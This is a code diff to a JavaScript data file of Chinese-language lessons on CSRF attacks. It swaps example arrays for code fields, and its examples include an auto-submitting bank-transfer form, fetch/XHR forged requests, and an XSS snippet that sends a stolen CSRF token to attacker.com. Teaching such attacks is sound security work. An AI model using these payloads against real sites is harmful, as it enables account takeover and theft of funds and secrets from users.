@@ -195,19 +195,14 @@ const knowledgeData = {
       {
         title: 'POST型CSRF',
         content: 'POST型CSRF攻击更加复杂，因为需要构造一个表单并自动提交。这通常用于更敏感的操作，如密码更改、资金转账等。需要JavaScript自动提交表单。',
-        examples: [
-          "<form id='csrf-form' action='https://bank.example/transfer' method='POST'>\n  <input type='hidden' name='to' value='attacker'>\n  <input type='hidden' name='amount' value='1000'>\n</form>\n<script>document.getElementById('csrf-form').submit();</script>"
-        ],
-        difficulty: 'intermediate'
+        code: 
+"<form id='csrf-form' action='https://bank.example/transfer' method='POST'>\n  <input type='hidden' name='to' value='attacker'>\n  <input type='hidden' name='amount' value='1000'>\n</form>\n<script>document.getElementById('csrf-form').submit();</script>"
       },
       {
-        title: 'CSRF漏洞POC改造',
-        content: 'CSRF漏洞POC改造是指对已知的CSRF攻击进行修改和优化，使其更难被检测或适应特定目标网站的需求。这可能包括调整请求参数、添加延迟触发等。',
-        examples: [
-          "使用fetch API: fetch('https://target.com/api/update', {\n  method: 'POST',\n  credentials: 'include',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ newEmail: 'hacked@evil.com' })\n});",
-          "XMLHttpRequest: var xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://target.com/api/action', true);\nxhr.withCredentials = true;\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nxhr.send('param1=value1&param2=value2');"
-        ],
-        difficulty: 'advanced'
+        title: 'CSRF Token窃取',
+        content: 'CSRF Token是一种防御CSRF攻击的常见方法，但在某些情况下，攻击者可以窃取这些Token并绕过防护。Token窃取通常依赖于XSS漏洞或其他信息泄露来获取有效Token，然后在CSRF攻击中使用。',
+        code:
+"// 通过XSS窃取CSRF Token\nlet token = document.querySelector('input[name=csrf_token]').value;\n\n// 将Token发送到攻击者控制的服务器\nfetch('https://attacker.com/collect?token=' + token);\n\n// 之后使用窃取的Token构造CSRF攻击\n<form action=\"https://victim.com/action\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"STOLEN_TOKEN\">\n  <input type=\"hidden\" name=\"action\" value=\"malicious_action\">\n</form>"
       },
       {
         title: 'CSRF绕过Referer检测',
